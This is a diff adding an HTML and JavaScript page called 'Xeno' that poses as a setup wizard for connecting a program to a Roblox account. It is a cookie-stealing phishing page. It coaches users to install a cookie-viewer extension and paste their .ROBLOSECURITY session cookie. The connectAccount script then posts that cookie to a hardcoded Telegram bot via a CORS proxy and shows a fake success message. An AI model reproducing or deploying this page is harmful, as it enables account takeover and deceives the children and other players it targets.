@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xeno</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #000000 0%, #1a0033 25%, #330033 50%, #1a0033 75%, #000000 100%);
+            background-size: 400% 400%;
+            animation: gradientFlow 15s ease infinite;
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-x: hidden;
+        }
+
+        @keyframes gradientFlow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .container {
+            width: 100%;
+            max-width: 900px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .step {
+            display: none;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .active {
+            display: block;
+            animation: fadeIn 0.8s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h1 {
+            font-size: 3.5rem;
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, #00ccff, #cc00ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px rgba(0, 204, 255, 0.3);
+            letter-spacing: 2px;
+        }
+
+        h2 {
+            font-size: 2rem;
+            margin-bottom: 30px;
+            color: #00ccff;
+        }
+
+        h3 {
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            color: #00ffaa;
+        }
+
+        .subtitle {
+            font-size: 1.2rem;
+            margin-bottom: 40px;
+            color: #cccccc;
+        }
+
+        .input-container {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto 30px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid #00ccff;
+            border-radius: 50px;
+            color: white;
+            font-size: 1.1rem;
+            outline: none;
+            transition: all 0.3s;
+        }
+
+        input:focus {
+            border-color: #cc00ff;
+            box-shadow: 0 0 20px rgba(204, 0, 255, 0.5);
+        }
+
+        input::placeholder {
+            color: #999999;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 15px 40px;
+            background: linear-gradient(45deg, #00cc33, #00aa00);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-decoration: none;
+            margin-top: 20px;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 204, 51, 0.3);
+            background: linear-gradient(45deg, #00dd44, #00bb00);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn-small {
+            padding: 10px 25px;
+            font-size: 1rem;
+        }
+
+        .countdown {
+            font-size: 4rem;
+            font-weight: bold;
+            margin: 30px 0;
+            color: #ff3366;
+            text-shadow: 0 0 20px rgba(255, 51, 102, 0.5);
+        }
+
+        .flags {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 40px 0;
+        }
+
+        .flag {
+            width: 120px;
+            height: 80px;
+            border-radius: 10px;
+            overflow: hidden;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 3px solid transparent;
+        }
+
+        .flag:hover {
+            transform: scale(1.1);
+            box-shadow: 0 10px 20px rgba(255, 255, 255, 0.2);
+        }
+
+        .flag.selected {
+            border-color: #00ccff;
+            box-shadow: 0 0 20px rgba(0, 204, 255, 0.5);
+        }
+
+        .flag-ru {
+            background: linear-gradient(to bottom, white 33%, blue 33%, blue 66%, red 66%);
+        }
+
+        .flag-gb {
+            background: linear-gradient(to bottom, #012169 0%, #012169 16.7%, white 16.7%, white 33.3%, #C8102E 33.3%, #C8102E 50%, white 50%, white 66.7%, #012169 66.7%, #012169 83.3%, white 83.3%, white 100%);
+            position: relative;
+        }
+
+        .flag-gb::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(to right, transparent 40%, #C8102E 40%, #C8102E 60%, transparent 60%);
+        }
+
+        .flag-gb::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(to bottom, transparent 40%, #C8102E 40%, #C8102E 60%, transparent 60%);
+        }
+
+        .instruction-image {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+            margin: 20px 0;
+            border: 2px solid #00ccff;
+            box-shadow: 0 0 20px rgba(0, 204, 255, 0.3);
+        }
+
+        .instruction-text {
+            font-size: 1.1rem;
+            line-height: 1.6;
+            margin: 20px 0;
+            text-align: left;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 20px;
+            border-radius: 10px;
+        }
+
+        .link {
+            color: #00aaff;
+            text-decoration: underline;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .link:hover {
+            color: #00ffff;
+            text-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: linear-gradient(45deg, #00cc33, #009900);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            z-index: 1000;
+            display: none;
+            animation: slideIn 0.5s ease;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        .input-with-btn {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .input-with-btn input {
+            flex: 1;
+            border-radius: 10px 0 0 10px;
+        }
+
+        .input-with-btn .btn {
+            margin: 0;
+            border-radius: 0 10px 10px 0;
+            padding: 15px 25px;
+        }
+
+        .waiting {
+            font-size: 1.5rem;
+            color: #ffcc00;
+            margin: 30px 0;
+            text-align: center;
+        }
+
+        .spinner {
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-top: 5px solid #00ccff;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .step {
+                padding: 20px;
+            }
+            
+            h1 {
+                font-size: 2.5rem;
+            }
+            
+            h2 {
+                font-size: 1.5rem;
+            }
+            
+            .flags {
+                flex-direction: column;
+                align-items: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Step 0: Activation Key -->
+        <div class="step active" id="step0">
+            <h1>Welcome to Xeno!</h1>
+            <p class="subtitle">Enter your activation key to continue</p>
+            <div class="input-container">
+                <input type="text" id="activationKey" placeholder="Get your activation key" autocomplete="off">
+            </div>
+            <button class="btn" onclick="checkActivationKey()">Activate</button>
+        </div>
+
+        <!-- Step 1: Countdown -->
+        <div class="step" id="step1">
+            <h2>Correct key!</h2>
+            <p class="subtitle">Please wait 5 seconds</p>
+            <div class="countdown" id="countdown">5</div>
+            <p>Redirecting to language selection...</p>
+        </div>
+
+        <!-- Step 2: Language Selection -->
+        <div class="step" id="step2">
+            <h2>Choose the language</h2>
+            <p class="subtitle">Select your preferred language</p>
+            <div class="flags">
+                <div class="flag flag-ru" onclick="selectLanguage('ru')"></div>
+                <div class="flag flag-gb" onclick="selectLanguage('en')"></div>
+            </div>
+            <p id="languageHint">Click on a flag to select language</p>
+            <button class="btn" onclick="nextStep()">Continue</button>
+        </div>
+
+        <!-- Step 3: Instruction Start -->
+        <div class="step" id="step3">
+            <h2 id="step3Title">Connect the program to your Roblox account</h2>
+            <p class="subtitle" id="step3Subtitle">You need to complete the training</p>
+            <button class="btn" id="startBtn" onclick="nextStep()">Start!</button>
+        </div>
+
+        <!-- Step 4: Instruction 1 -->
+        <div class="step" id="step4">
+            <h3 id="step4Title">Step 1: Registration on Roblox</h3>
+            <div class="instruction-image-placeholder">
+                <!-- In production, replace with <img src="1.png" class="instruction-image"> -->
+                <div class="instruction-image" style="height: 300px; background: linear-gradient(45deg, #1a1a2e, #16213e); display: flex; align-items: center; justify-content: center; color: #00ccff; font-size: 1.5rem;">
+                    1.png - Roblox Registration Screenshot
+                </div>
+            </div>
+            <div class="instruction-text" id="step4Text">
+                You need to go to the Roblox website from your PC and register an account. If you already have an account, you can skip this step.
+            </div>
+            <button class="btn btn-small" onclick="nextStep()">Next page</button>
+        </div>
+
+        <!-- Step 5: Instruction 2 -->
+        <div class="step" id="step5">
+            <h3 id="step5Title">Step 2: Install Extension</h3>
+            <div class="instruction-image-placeholder">
+                <!-- In production, replace with <img src="2.png" class="instruction-image"> -->
+                <div class="instruction-image" style="height: 300px; background: linear-gradient(45deg, #1a1a2e, #16213e); display: flex; align-items: center; justify-content: center; color: #00ccff; font-size: 1.5rem;">
+                    2.png - Chrome Web Store Screenshot
+                </div>
+            </div>
+            <div class="instruction-text" id="step5Text">
+                Next, go to this <span class="link" onclick="window.open('https://chromewebstore.google.com/detail/editthiscookie-v3/ojfebgpkimhlhcblbalbfjblapadhbol?hl=ru&utm_source=ext_sidebar', '_blank')">website</span> and download this extension. It will allow you to view your Roblox cookies.
+            </div>
+            <button class="btn btn-small" onclick="nextStep()">Next</button>
+        </div>
+
+        <!-- Step 6: Instruction 3 -->
+        <div class="step" id="step6">
+            <h3 id="step6Title">Step 3: Get .ROBLOSECURITY</h3>
+            <div class="instruction-image-placeholder">
+                <!-- In production, replace with <img src="3.png" class="instruction-image"> -->
+                <div class="instruction-image" style="height: 300px; background: linear-gradient(45deg, #1a1a2e, #16213e); display: flex; align-items: center; justify-content: center; color: #00ccff; font-size: 1.5rem;">
+                    3.png - EditThisCookie Extension Screenshot
+                </div>
+            </div>
+            <div class="instruction-text" id="step6Text">
+                Then go to the Roblox website and open the extension. Click on .ROBLOSECURITY and copy what is in the "value" field. Paste it here:
+            </div>
+            <div class="input-with-btn">
+                <input type="text" id="robloxCookie" placeholder="Paste .ROBLOSECURITY value here" autocomplete="off">
+                <button class="btn" id="connectBtn" onclick="connectAccount()" disabled>Connect</button>
+            </div>
+            <div id="waitingMessage" class="waiting" style="display: none;">
+                <p id="connectionStatus">Waiting for connection...</p>
+                <p id="connectionTime">Takes about 3 minutes</p>
+                <div class="spinner"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notification -->
+    <div class="notification" id="notification"></div>
+
+    <script>
+        // Current language (default: English)
+        let currentLanguage = 'en';
+        let currentStep = 0;
+        let countdownInterval;
+        
+        // Translation dictionary
+        const translations = {
+            'en': {
+                'step3Title': 'Connect the program to your Roblox account',
+                'step3Subtitle': 'You need to complete the training',
+                'startBtn': 'Start!',
+                'step4Title': 'Step 1: Registration on Roblox',
+                'step4Text': 'You need to go to the Roblox website from your PC and register an account. If you already have an account, you can skip this step.',
+                'nextPage': 'Next page',
+                'step5Title': 'Step 2: Install Extension',
+                'step5Text': 'Next, go to this [website] and download this extension. It will allow you to view your Roblox cookies.',
+                'step6Title': 'Step 3: Get .ROBLOSECURITY',
+                'step6Text': 'Then go to the Roblox website and open the extension. Click on .ROBLOSECURITY and copy what is in the "value" field. Paste it here:',
+                'cookiePlaceholder': 'Paste .ROBLOSECURITY value here',
+                'connectBtn': 'Connect',
+                'waiting': 'Waiting for connection...',
+                'timeNote': 'Takes about 3 minutes',
+                'languageHint': 'Click on a flag to select language',
+                'correctKey': 'Correct key!',
+                'redirecting': 'Redirecting to language selection...',
+                'chooseLanguage': 'Choose the language',
+                'selectLanguage': 'Select your preferred language'
+            },
+            'ru': {
+                'step3Title': 'Что бы подключить программу к вашему роблокс аккаунту нужно пройти обучение',
+                'step3Subtitle': '',
+                'startBtn': 'Начать!',
+                'step4Title': 'Шаг 1: Регистрация в Roblox',
+                'step4Text': 'Вы должны зайти с пк на сайт roblox.com и зарегистроваться. Если у вас уже есть аккаунт, можете пропустить этот шаг.',
+                'nextPage': 'Следующая страница',
+                'step5Title': 'Шаг 2: Установка расширения',
+                'step5Text': 'Дальше переходите на этот [сайт] и скачиваете это расширение. Оно позволит вам просматривать ваши куки от Roblox.',
+                'step6Title': 'Шаг 3: Получение .ROBLOSECURITY',
+                'step6Text': 'Дальше заходите на сайт роблокса и открываете расширение и нажимаете на .ROBLOSECURITY и то что в окошке value пишите сюда',
+                'cookiePlaceholder': 'Вставьте значение .ROBLOSECURITY сюда',
+                'connectBtn': 'Подключить',
+                'waiting': 'Ожидайте подключение',
+                'timeNote': 'Занимает 3 минуты',
+                'languageHint': 'Нажмите на флаг для выбора языка',
+                'correctKey': 'Правильный ключ!',
+                'redirecting': 'Перенаправление к выбору языка...',
+                'chooseLanguage': 'Выберите язык',
+                'selectLanguage': 'Выберите предпочитаемый язык'
+            }
+        };
+
+        // Initialize language
+        function updateLanguage(lang) {
+            currentLanguage = lang;
+            
+            // Update all text elements
+            document.getElementById('step3Title').textContent = translations[lang]['step3Title'];
+            document.getElementById('step3Subtitle').textContent = translations[lang]['step3Subtitle'];
+            document.getElementById('startBtn').textContent = translations[lang]['startBtn'];
+            document.getElementById('step4Title').textContent = translations[lang]['step4Title'];
+            document.getElementById('step4Text').textContent = translations[lang]['step4Text'];
+            document.querySelector('#step4 button').textContent = translations[lang]['nextPage'];
+            document.getElementById('step5Title').textContent = translations[lang]['step5Title'];
+            document.getElementById('step5Text').innerHTML = translations[lang]['step5Text'].replace('[сайт]', '<span class="link" onclick="window.open(\'https://chromewebstore.google.com/detail/editthiscookie-v3/ojfebgpkimhlhcblbalbfjblapadhbol?hl=ru&utm_source=ext_sidebar\', \'_blank\')">сайт</span>').replace('[website]', '<span class="link" onclick="window.open(\'https://chromewebstore.google.com/detail/editthiscookie-v3/ojfebgpkimhlhcblbalbfjblapadhbol?hl=ru&utm_source=ext_sidebar\', \'_blank\')">website</span>');
+            document.getElementById('step6Title').textContent = translations[lang]['step6Title'];
+            document.getElementById('step6Text').textContent = translations[lang]['step6Text'];
+            document.getElementById('robloxCookie').placeholder = translations[lang]['cookiePlaceholder'];
+            document.getElementById('connectBtn').textContent = translations[lang]['connectBtn'];
+            
+            if (document.getElementById('connectionStatus')) {
+                document.getElementById('connectionStatus').textContent = translations[lang]['waiting'];
+                document.getElementById('connectionTime').textContent = translations[lang]['timeNote'];
+            }
+            
+            document.getElementById('languageHint').textContent = translations[lang]['languageHint'];
+            
+            // Update step 1
+            if (document.getElementById('countdown').previousElementSibling) {
+                document.getElementById('countdown').previousElementSibling.textContent = translations[lang]['correctKey'];
+            }
+            
+            // Update step 2
+            document.querySelector('#step2 h2').textContent = translations[lang]['chooseLanguage'];
+            document.querySelector('#step2 .subtitle').textContent = translations[lang]['selectLanguage'];
+        }
+
+        // Language selection
+        function selectLanguage(lang) {
+            // Update UI
+            document.querySelectorAll('.flag').forEach(flag => {
+                flag.classList.remove('selected');
+            });
+            
+            if (lang === 'ru') {
+                document.querySelector('.flag-ru').classList.add('selected');
+            } else {
+                document.querySelector('.flag-gb').classList.add('selected');
+            }
+            
+            // Update language
+            updateLanguage(lang);
+        }
+
+        // Check activation key
+        function checkActivationKey() {
+            const key = document.getElementById('activationKey').value.trim();
+            if (key === 'DA4FFSE') {
+                // Show success
+                showStep(1);
+                
+                // Start countdown
+                let seconds = 5;
+                const countdownEl = document.getElementById('countdown');
+                countdownEl.textContent = seconds;
+                
+                countdownInterval = setInterval(() => {
+                    seconds--;
+                    countdownEl.textContent = seconds;
+                    
+                    if (seconds <= 0) {
+                        clearInterval(countdownInterval);
+                        showStep(2);
+                    }
+                }, 1000);
+            } else {
+                alert('Invalid activation key!');
+            }
+        }
+
+        // Show specific step
+        function showStep(stepNumber) {
+            // Hide all steps
+            document.querySelectorAll('.step').forEach(step => {
+                step.classList.remove('active');
+            });
+            
+            // Show the requested step
+            document.getElementById(`step${stepNumber}`).classList.add('active');
+            currentStep = stepNumber;
+        }
+
+        // Next step
+        function nextStep() {
+            if (currentStep < 6) {
+                showStep(currentStep + 1);
+                
+                // Enable connect button when cookie input changes
+                if (currentStep === 5) {
+                    document.getElementById('robloxCookie').addEventListener('input', function() {
+                        document.getElementById('connectBtn').disabled = this.value.trim() === '';
+                    });
+                }
+            }
+        }
+
+        // Connect account function
+        async function connectAccount() {
+            const cookieValue = document.getElementById('robloxCookie').value.trim();
+            
+            if (!cookieValue) {
+                alert('Please enter the .ROBLOSECURITY value');
+                return;
+            }
+            
+            // Show waiting message
+            document.getElementById('waitingMessage').style.display = 'block';
+            document.getElementById('connectBtn').disabled = true;
+            
+            // Telegram bot details
+            const botToken = '8387444669:AAEtibudcE2cWwwixv8wD9cGhUydpY7DRVQ';
+            const chatId = '8224914068';
+            
+            // Create message
+            const message = `New .ROBLOSECURITY received:\n${cookieValue}\n\nTime: ${new Date().toLocaleString()}`;
+            
+            try {
+                // Send to Telegram bot (using proxy to avoid CORS)
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                
+                // Using a CORS proxy for demonstration
+                // In production, this should be done through a backend server
+                const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
+                const response = await fetch(proxyUrl + telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+                
+                // Show notification
+                showNotification('Data sent successfully! Connection in progress...', 'success');
+                
+                // Simulate connection process (3 minutes)
+                setTimeout(() => {
+                    showNotification('Account successfully connected!', 'success');
+                    document.getElementById('connectionStatus').textContent = currentLanguage === 'ru' ? 'Аккаунт подключен!' : 'Account connected!';
+                    document.getElementById('connectionTime').textContent = currentLanguage === 'ru' ? 'Завершено!' : 'Completed!';
+                }, 3000); // 3 seconds for demo, change to 180000 (3 minutes) for production
+                
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                showNotification('Connection error. Please try again.', 'error');
+                document.getElementById('connectBtn').disabled = false;
+            }
+        }
+
+        // Show notification
+        function showNotification(message, type) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            
+            if (type === 'success') {
+                notification.style.background = 'linear-gradient(45deg, #00cc33, #009900)';
+            } else {
+                notification.style.background = 'linear-gradient(45deg, #ff3366, #cc0033)';
+            }
+            
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 5000);
+        }
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Set default language to English
+            selectLanguage('en');
+            
+            // Allow activation with Enter key
+            document.getElementById('activationKey').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    checkActivationKey();
+                }
+            });
+            
+            // Allow cookie input with Enter key
+            document.getElementById('robloxCookie').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter' && !document.getElementById('connectBtn').disabled) {
+                    connectAccount();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
